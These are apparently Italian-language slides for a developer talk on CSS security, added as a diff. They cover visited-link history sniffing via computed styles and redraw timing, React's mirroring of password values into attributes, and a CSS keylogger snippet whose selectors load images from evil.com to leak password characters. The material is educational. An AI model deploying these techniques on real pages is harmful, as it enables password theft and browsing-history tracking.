@@ -1,0 +1,138 @@
+<p-slide>
+  <h1 class="center">A che serve CSS?</h1>
+</p-slide>
+<p-slide>
+  <div class="two-columns">
+    <div class="center">
+      <h1 class="meme-text" style="margin-bottom: -1em;">HTML</h1>
+      <img src="img/ugly-car.jpg" alt="An ugly car, but still a car">
+    </div>
+    <p-fragment class="center">
+      <h1 class="meme-text" style="margin-bottom: -1em;">HTML+CSS</h1>
+      <img src="img/beautiful-car.jpg" alt="An beautiful car, but still a car">
+    </p-fragment>
+  </div>
+</p-slide>
+<p-slide class="justify-end">
+  <h1 class="meme-text center uppercase">CSS&hellip; un linguaggio?!</h1>
+  <img src="img/laugh.webp" alt="A man laughing" class="full-media">
+</p-slide>
+<p-slide class="align-center">
+  <h1 class="center">Eppure&hellip;</h1>
+</p-slide>
+<p-slide>
+  <h3 class="our-header">~2000</h3>
+  <div class="two-columns">
+    <div>
+      <a href="//nowhere.really">F.C. Barcelona</a><br>
+      <a href=".">Real Madrid C.F.</a><br>
+    </div>
+    <p-fragment class="big-x-wrapper">
+      <pre class="language-js"><code>function isVisited(a) {
+  return getComputedStyle(a).color
+    === 'rgb(85, 26, 139)';
+}</code></pre>
+      <p-fragment class="big-x"></p-fragment>
+    </p-fragment>
+  </div>
+  <p-notes>Non funziona più perché <code>getComputedStyle</code> ora restituisce sempre lo stile del link non visitato</p-notes>
+</p-slide>
+<p-slide>
+  <h3 class="our-header">2013</h3>
+  <div class="two-columns">
+    <div>
+      <pre class="language-css"><code>a:visited {
+  border-radius: 10% 20% 30% 40%;
+  box-shadow: 0 0 50em blue;
+  text-shadow: 0 0 50em red;
+  transform: skew(10deg 10deg);
+  filter: url('effect.svg#effect');
+}</code></pre>
+    </div>
+    <p-fragment class="big-x-wrapper">
+      <pre class="language-js"><code>function isVisited(a) {
+  return new Promise(resolve => {
+    const start = Date.now();
+    requestAnimationFrame(now => {
+      resolve(now - start > 17);
+    });
+  });
+}</code></pre>
+    </p-fragment>
+  </div>
+</p-slide>
+<p-slide>
+  <img src="img/wontfix.png" alt="Screenshot of Chrome Bugtracker marking the issue 'Visited links can be detected via redraw timing' as 'Won't fix'" class="full-media">
+</p-slide>
+<p-slide>
+  <img src="img/panic.gif" alt="Kermit panicking" class="full-media">
+</p-slide>
+<p-slide class="center">
+  <h1>Ma</h1>
+  <p-fragment>
+    <p>I browser sono sempre più veloci</p>
+  </p-fragment>
+  <p-fragment>
+    <p>👇</p>
+    <p>Exploit ormai inaffidabile</p>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <h2 class="center">Ci stiamo solo scaldando&hellip;</h2>
+</p-slide>
+<p-slide class="center">
+  <img src="img/react.svg" alt="React.js" style="height: 4em;">
+  <p-fragment>sincronizza attributo e proprietà <code>value</code></p-fragment>
+  <p-fragment><h3>degli elementi <code>&lt;input></code></h3></p-fragment>
+  <p-fragment><h2>anche <code>type="password"</code></h2></p-fragment>
+</p-slide>
+<p-slide>
+  <pre class="language-jsx self-center"><code>import { useState } from 'react';
+
+export default function UserPassword() {
+  const [pwd, setPwd] = useState('');
+  return &lt;label>Password:
+    &lt;input type="password" value={pwd}
+      onChange={e => setPwd(e.target.value)}
+    />
+  &lt;/label>;
+}</code></pre>
+</p-slide>
+<p-slide>
+  <img src="img/whatever.gif" alt="Whatever" class="full-media">
+</p-slide>
+<p-slide>
+<pre class="language-css self-center"><code>input[type='password'][value$='a']::before {
+  content: url('http://evil.com/a.gif');
+}
+input[type='password'][value$='b']::before {
+  content: url('http://evil.com/b.gif');
+}
+input[type='password'][value$='c']::before {
+  content: url('http://evil.com/c.gif');
+}
+...</code></pre>
+</p-slide>
+<p-slide>
+  <img src="img/really.gif" alt="Really?" class="full-media">
+</p-slide>
+<p-slide class="center">
+  <h1>Abbiamo la <em>certezza</em> di sapere da dove arrivano i nostri fogli di stile?</h1>
+</p-slide>
+<p-slide class="justify-end">
+  <img src="img/pfft-duh.gif" alt="Pfft, duh!" class="full-media">
+  <h2 class="meme-text center uppercase">Beh ovvio!</h2>
+</p-slide>
+<p-slide>
+  <h1 class="center">Potreste non essere stati <em>voi</em> ad essere attaccati</h1>
+</p-slide>
+<p-slide>
+  <h4 class="our-header">Script esterni nelle nostre pagine</h4>
+  <ul class="self-center">
+    <li><p-fragment>👉 profilazione</p-fragment></li>
+    <li><p-fragment>👉 pubblicità</p-fragment></li>
+    <li><p-fragment>👉 social</p-fragment></li>
+    <li><p-fragment>👉 video</p-fragment></li>
+    <li><p-fragment>👉 widget</p-fragment></li>
+  </ul>
+</p-slide>
